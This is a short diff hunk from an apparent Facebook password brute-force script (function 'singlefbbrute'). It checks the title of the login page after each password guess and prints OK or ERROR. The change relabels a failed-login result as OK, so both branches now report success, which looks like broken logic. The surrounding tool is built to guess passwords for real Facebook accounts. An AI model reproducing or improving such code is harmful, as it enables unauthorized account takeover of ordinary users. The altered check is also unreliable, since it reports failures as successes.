@@ -134,7 +134,7 @@ def singlefbbrute():
             soup = BeautifulSoup(b.content, 'html.parser')
             a = soup.find('title')
             if(str(a) == '<title>Masuk Facebook | Facebook</title>'):
-                print(C+' ['+W+' ERROR '+C+']'+R+' > '+W+password,end='', flush=True)
+                print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
             elif(str(a) == '<title>Facebook</title>'):
                 print(C+' ['+G+' OK '+C+']'+R+' > '+W+password,end='', flush=True)
                 print ('')
